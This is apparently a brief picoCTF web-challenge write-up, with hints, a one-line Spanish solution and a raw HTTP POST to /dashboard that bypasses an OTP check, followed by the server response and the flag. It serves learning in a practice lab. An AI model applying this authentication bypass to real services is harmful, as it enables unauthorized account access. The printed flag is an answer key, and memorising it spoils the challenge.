Additional details will be available after launching your challenge instance.
Try [here](http://titan.picoctf.net:58071/) to find the flag

### Hints

- Try using burpsuite to intercept request to capture the flag.
- Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.


## Solved

- hacer un POST /dashboard desde el inicio

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:63863
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:63863/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Cookie: session=.eJxNjEsKAyEQBe_iOosW56O5jLTaMiGOih9CCLn7uHOWVbxXP2Zf7cue7EgB2YPZWrxu6U1xOGMN0Kpwd7B6C7R4cAq5dCh2u4ASm_DKAR8_30PQEU-aqdTyAC43yWFgxlo_qbg5yEeKpGM_DZVpe6VyD_0vDi8yxg.Z9SFqg.N0g4uzAB9l8Cow0bdmPa-0_FV5Y
Connection: keep-alive



HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Fri, 14 Mar 2025 19:38:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 105
Vary: Cookie
Connection: close

Welcome, hola you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
```

picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}